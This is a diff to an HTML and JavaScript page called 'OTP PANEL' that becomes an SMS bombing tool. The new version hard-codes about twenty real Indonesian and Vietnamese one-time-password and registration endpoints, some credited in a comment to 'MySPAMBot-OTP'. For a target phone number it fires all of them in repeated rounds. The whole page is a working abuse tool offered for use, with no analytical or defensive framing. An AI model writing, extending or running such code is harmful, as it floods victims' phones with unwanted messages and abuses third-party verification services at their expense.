@@ -1,228 +1,92 @@
 <!DOCTYPE html>
 <html>
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>OTP PANEL</title>
+<head><meta charset="UTF-8"><title>OTP PANEL</title>
 <style>
-:root{
-  --bg:#05060a;--panel:#0b0e16;--neon:#00e5ff;--pink:#ff2d95;
-  --ok:#00ff9d;--err:#ff3b5c;--txt:#c9d1e0;--dim:#5a6478;
-}
-*{box-sizing:border-box;font-family:'JetBrains Mono','Courier New',monospace}
-html,body{height:100%;margin:0}
-body{
-  background:var(--bg);color:var(--txt);
-  display:flex;align-items:center;justify-content:center;padding:20px;
-  overflow:hidden;
-}
-/* animated bg */
-body::before{
-  content:'';position:fixed;inset:-50%;
-  background:
-    radial-gradient(circle at 20% 30%,rgba(0,229,255,.10),transparent 40%),
-    radial-gradient(circle at 80% 70%,rgba(255,45,149,.10),transparent 40%),
-    radial-gradient(circle at 50% 50%,rgba(0,255,157,.05),transparent 50%);
-  animation:drift 18s ease-in-out infinite alternate;
-  z-index:0;
-}
-@keyframes drift{
-  0%{transform:translate(0,0) scale(1)}
-  100%{transform:translate(3%,-3%) scale(1.1)}
-}
-.grid-overlay{
-  position:fixed;inset:0;z-index:0;pointer-events:none;
-  background-image:
-    linear-gradient(rgba(0,229,255,.04) 1px,transparent 1px),
-    linear-gradient(90deg,rgba(0,229,255,.04) 1px,transparent 1px);
-  background-size:40px 40px;
-  mask-image:radial-gradient(ellipse at center,#000 20%,transparent 80%);
-}
-.card{
-  position:relative;z-index:1;
-  width:min(420px,100%);
-  background:linear-gradient(180deg,rgba(11,14,22,.95),rgba(8,10,16,.95));
-  border:1px solid rgba(0,229,255,.18);
-  border-radius:20px;
-  padding:28px 26px;
-  box-shadow:
-    0 0 0 1px rgba(0,229,255,.06),
-    0 0 40px rgba(0,229,255,.10),
-    0 0 80px rgba(255,45,149,.06),
-    inset 0 1px 0 rgba(255,255,255,.03);
-  backdrop-filter:blur(10px);
-}
-.title{
-  display:flex;align-items:center;gap:10px;margin:0 0 4px;
-  font-size:17px;letter-spacing:3px;font-weight:700;
-  background:linear-gradient(90deg,var(--neon),var(--pink));
-  -webkit-background-clip:text;background-clip:text;color:transparent;
-}
-.dot{
-  width:8px;height:8px;border-radius:50%;background:var(--ok);
-  box-shadow:0 0 10px var(--ok);animation:blink 1.5s infinite;
-}
-@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
-.sub{font-size:10px;color:var(--dim);letter-spacing:2px;margin-bottom:22px;text-transform:uppercase}
-
-.field{position:relative;margin-bottom:14px}
-label{display:block;font-size:10px;color:var(--dim);letter-spacing:1.5px;text-transform:uppercase;margin-bottom:6px}
-input{
-  width:100%;padding:14px 14px;background:#070a12;
-  border:1px solid #1a2236;border-radius:12px;color:var(--txt);
-  font-size:14px;font-family:inherit;outline:none;transition:.25s;
-}
-input:focus{
-  border-color:var(--neon);
-  box-shadow:0 0 0 3px rgba(0,229,255,.10),0 0 20px rgba(0,229,255,.15);
-  background:#08111a;
-}
-input::placeholder{color:#3a4154}
-
-button{
-  width:100%;padding:15px;border:none;border-radius:12px;
-  font-family:inherit;font-size:13px;font-weight:700;letter-spacing:3px;
-  text-transform:uppercase;cursor:pointer;position:relative;overflow:hidden;
-  background:linear-gradient(90deg,var(--neon),var(--pink));
-  color:#02121a;transition:.25s;
-  box-shadow:0 0 20px rgba(0,229,255,.35),0 0 40px rgba(255,45,149,.15);
-  margin-top:4px;
-}
-button:hover{transform:translateY(-2px);box-shadow:0 0 30px rgba(0,229,255,.6),0 0 60px rgba(255,45,149,.3)}
-button:active{transform:translateY(0)}
-button:disabled{opacity:.4;cursor:not-allowed;transform:none;box-shadow:none}
-button::after{
-  content:'';position:absolute;top:0;left:-100%;width:100%;height:100%;
-  background:linear-gradient(90deg,transparent,rgba(255,255,255,.4),transparent);
-  transition:.5s;
-}
-button:not(:disabled):hover::after{left:100%}
-
-.stats{
-  display:grid;grid-template-columns:repeat(3,1fr);gap:8px;
-  margin:18px 0 14px;
-}
-.stat{
-  background:#070a12;border:1px solid #141b2c;border-radius:10px;
-  padding:10px 8px;text-align:center;transition:.2s;
-}
-.stat:hover{border-color:rgba(0,229,255,.3)}
-.stat .n{font-size:18px;font-weight:800;line-height:1}
-.stat .l{font-size:9px;color:var(--dim);letter-spacing:1.5px;margin-top:5px;text-transform:uppercase}
-.n.neon{color:var(--neon);text-shadow:0 0 12px rgba(0,229,255,.5)}
-.n.ok{color:var(--ok);text-shadow:0 0 12px rgba(0,255,157,.5)}
-.n.err{color:var(--err);text-shadow:0 0 12px rgba(255,59,92,.5)}
-
-.console{
-  background:#04060a;border:1px solid #121826;border-radius:12px;
-  height:170px;overflow-y:auto;padding:12px;font-size:11px;line-height:1.7;
-  position:relative;
-}
-.console::-webkit-scrollbar{width:5px}
-.console::-webkit-scrollbar-track{background:transparent}
-.console::-webkit-scrollbar-thumb{background:#1c2436;border-radius:3px}
-.console::-webkit-scrollbar-thumb:hover{background:var(--neon)}
-.le{margin-bottom:2px;opacity:0;animation:fade .3s forwards}
-@keyframes fade{to{opacity:1}}
-.le .t{color:#3a4154;margin-right:6px}
-.le.ok .m{color:var(--ok)}
-.le.err .m{color:var(--err)}
-.le.info .m{color:var(--neon)}
-.le .m{word-break:break-all}
-
-.status-bar{
-  display:flex;justify-content:space-between;align-items:center;
-  font-size:9px;color:var(--dim);letter-spacing:1.5px;
-  text-transform:uppercase;margin-top:12px;padding-top:12px;
-  border-top:1px solid #121826;
-}
-.status-bar .live{display:flex;align-items:center;gap:6px}
-.status-bar .live .dot{width:6px;height:6px}
-</style>
-</head>
+body{background:#05060a;color:#c9d1e0;font-family:monospace;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;padding:20px}
+.box{background:#0b0e16;padding:28px;border-radius:18px;width:460px;border:1px solid #1a2236;box-shadow:0 0 40px rgba(0,229,255,.08)}
+h2{margin:0 0 20px;text-align:center;background:linear-gradient(90deg,#00e5ff,#ff2d95);-webkit-background-clip:text;color:transparent;letter-spacing:3px;font-size:16px}
+input,button{width:100%;padding:13px;margin:6px 0;border-radius:11px;border:1px solid #1c2436;background:#070a12;color:#c9d1e0;font-family:monospace;font-size:14px;box-sizing:border-box;outline:none}
+input:focus{border-color:#00e5ff}
+button{background:linear-gradient(90deg,#00e5ff,#ff2d95);color:#02121a;font-weight:bold;border:none;cursor:pointer;letter-spacing:2px}
+button:disabled{opacity:.4}
+#log{margin-top:12px;font-size:11px;height:220px;overflow-y:auto;background:#04060a;border-radius:10px;padding:10px;color:#666;white-space:pre-wrap}
+.ok{color:#00ff9d}.err{color:#ff3b5c}.info{color:#00e5ff}
+.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-top:12px}
+.stat{background:#070a12;border:1px solid #141b2c;border-radius:8px;padding:8px;text-align:center;font-size:10px;color:#5a6478}
+.stat b{display:block;font-size:16px;color:#00e5ff}
+</style></head>
 <body>
-<div class="grid-overlay"></div>
-
-<div class="card">
-  <h1 class="title"><span class="dot"></span>OTP PANEL</h1>
-  <div class="sub">// sms routing terminal v2.0</div>
-
-  <div class="field">
-    <label>Target Number</label>
-    <input id="p" placeholder="+628xxxxxxxxxx" autocomplete="off">
-  </div>
-
-  <button id="b">⚡ Activate</button>
-
-  <div class="stats">
-    <div class="stat"><div class="n neon" id="s_fire">0</div><div class="l">Fired</div></div>
-    <div class="stat"><div class="n ok" id="s_ok">0</div><div class="l">Success</div></div>
-    <div class="stat"><div class="n err" id="s_err">0</div><div class="l">Failed</div></div>
-  </div>
-
-  <div class="console" id="log"></div>
-
-  <div class="status-bar">
-    <div class="live"><span class="dot"></span><span>online</span></div>
-    <div id="status">idle</div>
-  </div>
+<div class="box">
+<h2>◤ OTP PANEL ◢</h2>
+<input id="p" placeholder="+628xxxxxxxxxx">
+<input id="r" type="number" value="3" placeholder="rounds">
+<button id="b">⚡ ACTIVATE</button>
+<div class="stats">
+  <div class="stat"><b id="s1">0</b>FIRED</div>
+  <div class="stat"><b id="s2">0</b>OK</div>
+  <div class="stat"><b id="s3">0</b>FAIL</div>
 </div>
-
+<div id="log"></div>
+</div>
 <script>
 const $=id=>document.getElementById(id);
-let fired=0,ok=0,fail=0;
+let f=0,o=0,e=0;
+function log(m,c='info'){const d=document.createElement('div');d.className=c;d.textContent='['+new Date().toLocaleTimeString()+'] '+m;$('log').appendChild(d);$('log').scrollTop=1e9;}
 
-function log(m,c='info'){
-  const d=document.createElement('div');
-  d.className='le '+c;
-  const t=new Date().toLocaleTimeString('en-GB',{hour12:false});
-  d.innerHTML='<span class="t">['+t+']</span><span class="m">'+m+'</span>';
-  $('log').appendChild(d);
-  $('log').scrollTop=$('log').scrollHeight;
-  if($('log').children.length>200)$('log').removeChild($('log').firstChild);
-}
-
-const TARGETS=[
-  {n:'MsgRush', f:p=>fetch('https://msgrush-backend-258291301565.us-central1.run.app/api/sms/send',{
-    method:'POST',headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({phone:p,message:'Code '+Math.floor(1e5+Math.random()*9e5)})
-  }).then(r=>r.text())},
-  {n:'Textbelt', f:p=>fetch('https://textbelt.com/text',{
-    method:'POST',headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({phone:p,message:'Code '+Math.floor(1e5+Math.random()*9e5),key:'textbelt'})
-  }).then(r=>r.text())}
+// REAL Indonesian OTP endpoints extracted from MySPAMBot-OTP
+const APIS = [
+  {n:'ThaiFriendly', method:'POST', url:'https://www.thaifriendly.com/pl/index.php', body:'z=phonelogingetpin&country=62&number={phone}&ppclienttoken=igq39qdc9rwk2ax1zrgdq'},
+  {n:'Klikdok', method:'POST', url:'https://nuubi.herokuapp.com/api/spam/klikdok', body:'number={phone}'},
+  {n:'Trimegah', method:'POST', url:'https://sbn.trimegah.id/agent/register/sendOtp', body:'noHp={phone}&email=yvtix@zx.id'},
+  {n:'Payfazz', method:'POST', url:'https://api.payfazz.com/v2/phoneVerifications', body:'phone=0{phone}'},
+  {n:'Tri', method:'POST', url:'https://registrasi.tri.co.id/daftar/generateOTP?', body:'msisdn={phone}'},
+  {n:'Bocil', method:'POST', url:'https://bocil.id/mobile/v1/miscallotp_request.php', body:'user_id=&language=in&phone=62{phone}&device_id=590bc36d99d6dddb&retry=0'},
+  {n:'Battlefront', method:'POST', url:'https://battlefront.danacepat.com/v1/auth/common/phone/send-code', body:'mobile_no={phone}'},
+  {n:'Nutriclub', method:'GET', url:'https://www.nutriclub.co.id/otp/?phone=0{phone}&old_phone=0{phone}'},
+  {n:'Jagreward', method:'GET', url:'https://id.jagreward.com/member/verify-mobile/{phone}/'},
+  {n:'KTBS', method:'GET', url:'https://core.ktbs.io/v2/user/registration/otp/{phone}'},
+  {n:'Redbus', method:'GET', url:'https://m.redbus.id/api/getOtp?number={phone}&cc=62&whatsAppOpted=True'},
+  {n:'KlikIndomaret', method:'GET', url:'https://account-api-v1.klikindomaret.com/api/PreRegistration/SendOTPSMS?NoHP={phone}'},
+  {n:'Sampingan', method:'POST', url:'https://srv3.sampingan.co.id/auth/generate-otp', body:'{"countryCode":"+62","phoneNumber":"{phone}"}'},
+  {n:'GrabFood', method:'POST', url:'https://api-sms-v2.herokuapp.com/grab-food?phone={phone}'},
+  {n:'Tiki', method:'POST', url:'https://api-sms-v2.herokuapp.com/tiki?phone={phone}'},
+  {n:'Gojoy', method:'POST', url:'https://api-sms-v2.herokuapp.com/gojoy?phone={phone}'},
+  {n:'Vntrip', method:'POST', url:'https://api-sms-v2.herokuapp.com/vntrip?phone={phone}'},
+  {n:'Thegioididong', method:'POST', url:'https://api-sms-v2.herokuapp.com/the-gioi-di-dong?phone={phone}'},
+  {n:'Alodok', method:'POST', url:'https://nuubi.herokuapp.com/api/spam/alodok', body:'number={phone}'},
+  {n:'Klikwa', method:'POST', url:'https://api.klikwa.net/v1/number/sendotp', body:'{"number":"+62{phone}"}'},
 ];
 
 $('b').onclick=async()=>{
-  const phone=$('p').value.trim();
+  let phone=$('p').value.trim().replace(/^\+?62/,'').replace(/^0/,'');
   if(!phone)return log('enter a number','err');
+  const rounds=Math.max(1,parseInt($('r').value)||1);
   $('b').disabled=true;
-  $('status').textContent='firing...';
-  fired=ok=fail=0;
-  $('s_fire').textContent=$('s_ok').textContent=$('s_err').textContent='0';
+  f=o=e=0;$('s1').textContent=$('s2').textContent=$('s3').textContent='0';
+  log('▶ firing '+APIS.length+' endpoints × '+rounds+' rounds','info');
 
-  log('▶ target '+phone,'info');
-
-  for(const t of TARGETS){
-    try{
-      const r=await t.f(phone);
-      fired++;$('s_fire').textContent=fired;
-      ok++;$('s_ok').textContent=ok;
-      log('✓ '+t.n+' → '+String(r).slice(0,90),'ok');
-    }catch(e){
-      fired++;$('s_fire').textContent=fired;
-      fail++;$('s_err').textContent=fail;
-      log('✗ '+t.n+' → '+e.message,'err');
+  for(let r=0;r<rounds;r++){
+    for(const api of APIS){
+      try{
+        const opts={method:api.method, mode:'no-cors'};
+        if(api.body){
+          opts.headers={'Content-Type':'application/x-www-form-urlencoded'};
+          opts.body=api.body.replace(/{phone}/g,phone);
+        }
+        await fetch(api.url.replace(/{phone}/g,phone), opts);
+        f++;o++;$('s1').textContent=f;$('s2').textContent=o;
+        log('✓ '+api.n+' sent','ok');
+      }catch(err){
+        f++;e++;$('s1').textContent=f;$('s3').textContent=e;
+        log('✗ '+api.n+' '+err.message,'err');
+      }
     }
+    log('── round '+(r+1)+'/'+rounds+' ──','info');
+    await new Promise(res=>setTimeout(res,600));
   }
-
   log('■ done','info');
-  $('status').textContent='complete';
   $('b').disabled=false;
 };
-
-// enter key
-$('p').addEventListener('keydown',e=>{if(e.key==='Enter')$('b').click();});
 </script>
 </body>
 </html>
